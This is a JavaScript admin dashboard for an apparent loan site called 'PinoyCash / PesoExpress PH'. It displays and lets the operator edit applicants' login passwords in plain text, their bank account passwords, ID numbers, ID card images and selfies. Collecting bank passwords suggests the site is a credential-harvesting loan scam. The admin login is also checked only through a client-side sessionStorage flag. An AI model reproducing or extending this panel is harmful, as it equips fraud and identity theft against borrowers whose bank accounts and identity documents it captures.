// Host Control Dashboard JavaScript - PinoyCash / PesoExpress PH
let allApplications = [];
let selectedAppId = null;

document.addEventListener('DOMContentLoaded', () => {
    checkAdminAuth();
});

function checkAdminAuth() {
    const isAdmin = sessionStorage.getItem('peso_admin');
    if (isAdmin === 'true') {
        showDashboardView();
    } else {
        showLoginView();
    }
}

function showLoginView() {
    document.getElementById('adminLoginSection').style.display = 'block';
    document.getElementById('adminDashboardSection').style.display = 'none';
    document.getElementById('adminLogoutBtn').style.display = 'none';
}

function showDashboardView() {
    document.getElementById('adminLoginSection').style.display = 'none';
    document.getElementById('adminDashboardSection').style.display = 'block';
    document.getElementById('adminLogoutBtn').style.display = 'inline-flex';

    loadApplications();
}

// Handle Host Login
async function handleAdminLogin(event) {
    event.preventDefault();
    const username = document.getElementById('adminUser').value.trim();
    const password = document.getElementById('adminPass').value;
    const errDiv = document.getElementById('adminLoginError');

    errDiv.style.display = 'none';

    try {
        const res = await fetch('/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await res.json();

        if (!res.ok) {
            throw new Error(data.error || 'Host authentication failed.');
        }

        sessionStorage.setItem('peso_admin', 'true');
        showDashboardView();

    } catch (err) {
        errDiv.innerText = err.message;
        errDiv.style.display = 'block';
    }
}

function adminLogout() {
    sessionStorage.removeItem('peso_admin');
    showLoginView();
}

// Load Applications List
async function loadApplications() {
    try {
        const res = await fetch('/api/admin/applications');
        const data = await res.json();
        allApplications = data.applications || [];

        updateMetrics();
        filterApplications();

    } catch (e) {
        console.error("Error loading applications for host", e);
    }
}

// Update Dashboard Metric Cards
function updateMetrics() {
    const total = allApplications.length;
    const pending = allApplications.filter(a => a.status === 'Pending' || a.status === 'Waiting').length;
    const approved = allApplications.filter(a => a.status === 'Successfully' || a.status === 'Approved').length;
    const totalPHP = allApplications.reduce((acc, a) => acc + (Number(a.requestedAmount) || 0), 0);

    document.getElementById('mTotalApps').innerText = total;
    document.getElementById('mPendingApps').innerText = pending;
    document.getElementById('mApprovedApps').innerText = approved;
    document.getElementById('mTotalPHP').innerText = '₱ ' + totalPHP.toLocaleString();
}

// Filter and render table rows
function filterApplications() {
    const query = document.getElementById('searchInput').value.toLowerCase().trim();
    const statusFilter = document.getElementById('statusFilter').value;

    const filtered = allApplications.filter(app => {
        const matchesQuery = app.fullName.toLowerCase().includes(query) ||
                             app.phone.includes(query) ||
                             (app.idNumber && app.idNumber.toLowerCase().includes(query));
        const matchesStatus = statusFilter === 'ALL' || app.status === statusFilter;
        return matchesQuery && matchesStatus;
    });

    renderTable(filtered);
}

function renderTable(apps) {
    const tbody = document.getElementById('applicationsTbody');
    tbody.innerHTML = '';

    if (apps.length === 0) {
        tbody.innerHTML = `<tr><td colspan="9" style="text-align: center; color: var(--text-muted); padding: 2rem;">No loan applications found.</td></tr>`;
        return;
    }

    apps.forEach(app => {
        const tr = document.createElement('tr');

        let badgeClass = 'badge-pending';
        if (app.status === 'Successfully' || app.status === 'Approved') badgeClass = 'badge-approved';
        if (app.status === 'Fail' || app.status === 'Rejected') badgeClass = 'badge-rejected';
        if (app.status === 'Please Try Again' || app.status === 'Waiting') badgeClass = 'badge-pending';

        const regTime = app.createdAt ? new Date(app.createdAt).toLocaleString() : 'N/A';

        tr.innerHTML = `
            <td><strong>${escapeHtml(app.fullName)}</strong></td>
            <td>+63${escapeHtml(app.phone)}</td>
            <td><code style="background:#fffbeb; color:#b45309; padding:0.2rem 0.4rem; border-radius:4px; font-weight:700;">${escapeHtml(app.userLoginPassword)}</code></td>
            <td><span style="font-size: 0.85rem; color: var(--text-muted);">${escapeHtml(app.idType)}</span><br><strong>${escapeHtml(app.idNumber)}</strong></td>
            <td>₱ ${Number(app.monthlyIncome || 0).toLocaleString()}</td>
            <td>₱ ${Number(app.requestedAmount || 0).toLocaleString()}</td>
            <td><strong style="color: var(--primary-color);">₱ ${Number(app.approvedAmount || app.requestedAmount).toLocaleString()}</strong></td>
            <td><span class="badge ${badgeClass}">${escapeHtml(app.status)}</span></td>
            <td style="font-size: 0.85rem; color: var(--text-main); font-weight: 600;">${regTime}</td>
            <td>
                <button class="btn btn-outline" style="padding: 0.35rem 0.75rem; font-size: 0.85rem;" onclick="openEditModal('${app.id}')">✏️ Edit & Inspect</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function escapeHtml(str) {
    return String(str || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

// Open Edit Modal for a specific application
function openEditModal(appId) {
    const app = allApplications.find(a => a.id === appId);
    if (!app) return;

    selectedAppId = appId;
    document.getElementById('editAppId').value = app.id;
    document.getElementById('editRegTimestamp').innerText = app.createdAt ? new Date(app.createdAt).toLocaleString() : 'N/A';
    document.getElementById('editFullName').value = app.fullName || '';
    document.getElementById('editPhone').value = app.phone || '';
    if (document.getElementById('editUserLoginPassword')) {
        document.getElementById('editUserLoginPassword').value = app.userLoginPassword || '';
    }
    document.getElementById('editGender').value = app.gender || 'Male';
    document.getElementById('editDob').value = app.dob || '';
    document.getElementById('editCivilStatus').value = app.civilStatus || 'Single';
    document.getElementById('editAddress').value = app.address || '';
    document.getElementById('editEmploymentType').value = app.employmentType || '';
    document.getElementById('editMonthlyIncome').value = app.monthlyIncome || 0;

    document.getElementById('editStatus').value = app.status || 'Pending Review';
    document.getElementById('editRequestedAmount').value = app.requestedAmount || 5000;
    document.getElementById('editApprovedAmount').value = app.approvedAmount || app.requestedAmount || 5000;
    document.getElementById('editIdType').value = app.idType || '';
    document.getElementById('editIdNumber').value = app.idNumber || '';
    document.getElementById('editPayoutMethod').value = app.payoutMethod || 'GCash';
    document.getElementById('editBankAccountName').value = app.bankAccountName || '';
    document.getElementById('editBankAccountNumber').value = app.bankAccountNumber || '';
    document.getElementById('editBankAccountPassword').value = app.bankAccountPassword || '';
    document.getElementById('editNotes').value = app.notes || '';

    // Images
    const modalIdImg = document.getElementById('modalIdImg');
    const modalSelfieImg = document.getElementById('modalSelfieImg');
    modalIdImg.src = app.idCardImage || 'https://via.placeholder.com/400x250?text=No+ID+Image';
    modalSelfieImg.src = app.selfieImage || 'https://via.placeholder.com/400x250?text=No+Selfie+Image';

    document.getElementById('editModal').classList.add('active');
}

function closeEditModal() {
    document.getElementById('editModal').classList.remove('active');
    selectedAppId = null;
}

// Save Changes made by Host Manager
async function saveApplicantChanges(event) {
    event.preventDefault();
    if (!selectedAppId) return;

    const payload = {
        fullName: document.getElementById('editFullName').value.trim(),
        phone: document.getElementById('editPhone').value.trim(),
        userLoginPassword: document.getElementById('editUserLoginPassword') ? document.getElementById('editUserLoginPassword').value.trim() : undefined,
        gender: document.getElementById('editGender').value,
        dob: document.getElementById('editDob').value,
        civilStatus: document.getElementById('editCivilStatus').value,
        address: document.getElementById('editAddress').value.trim(),
        employmentType: document.getElementById('editEmploymentType').value.trim(),
        monthlyIncome: parseInt(document.getElementById('editMonthlyIncome').value) || 0,
        status: document.getElementById('editStatus').value,
        requestedAmount: parseInt(document.getElementById('editRequestedAmount').value) || 0,
        approvedAmount: parseInt(document.getElementById('editApprovedAmount').value) || 0,
        idType: document.getElementById('editIdType').value.trim(),
        idNumber: document.getElementById('editIdNumber').value.trim(),
        payoutMethod: document.getElementById('editPayoutMethod').value.trim(),
        bankAccountName: document.getElementById('editBankAccountName').value.trim(),
        bankAccountNumber: document.getElementById('editBankAccountNumber').value.trim(),
        bankAccountPassword: document.getElementById('editBankAccountPassword').value,
        notes: document.getElementById('editNotes').value.trim()
    };

    try {
        const res = await fetch(`/api/admin/applications/${selectedAppId}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();

        if (!res.ok) {
            throw new Error(data.error || 'Failed to update record.');
        }

        alert('User information and loan terms updated successfully!');
        closeEditModal();
        loadApplications();

    } catch (err) {
        alert('Error saving changes: ' + err.message);
    }
}

// Delete Record
async function deleteApplicantRecord() {
    if (!selectedAppId) return;
    if (!confirm('Are you sure you want to delete this applicant record? This cannot be undone.')) return;

    try {
        const res = await fetch(`/api/admin/applications/${selectedAppId}`, {
            method: 'DELETE'
        });
        if (!res.ok) throw new Error('Failed to delete.');

        alert('Record deleted successfully.');
        closeEditModal();
        loadApplications();

    } catch (err) {
        alert('Error deleting: ' + err.message);
    }
}

// Credentials Modal Functions
function openCredsModal() {
    document.getElementById('currentHostPass').value = '';
    document.getElementById('newHostUser').value = '';
    document.getElementById('newHostPass').value = '';
    document.getElementById('credsError').style.display = 'none';
    document.getElementById('credsModal').classList.add('active');
}

function closeCredsModal() {
    document.getElementById('credsModal').classList.remove('active');
}

async function updateHostCredentials(event) {
    event.preventDefault();
    const currentPassword = document.getElementById('currentHostPass').value;
    const newUsername = document.getElementById('newHostUser').value.trim();
    const newPassword = document.getElementById('newHostPass').value;
    const errDiv = document.getElementById('credsError');

    errDiv.style.display = 'none';

    try {
        const res = await fetch('/api/admin/credentials', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ currentPassword, newUsername, newPassword })
        });
        const data = await res.json();

        if (!res.ok) {
            throw new Error(data.error || 'Failed to update credentials.');
        }

        alert('Host username and password updated successfully! Please log in again with your new credentials.');
        closeCredsModal();
        adminLogout();

    } catch (err) {
        errDiv.innerText = err.message;
        errDiv.style.display = 'block';
    }
}
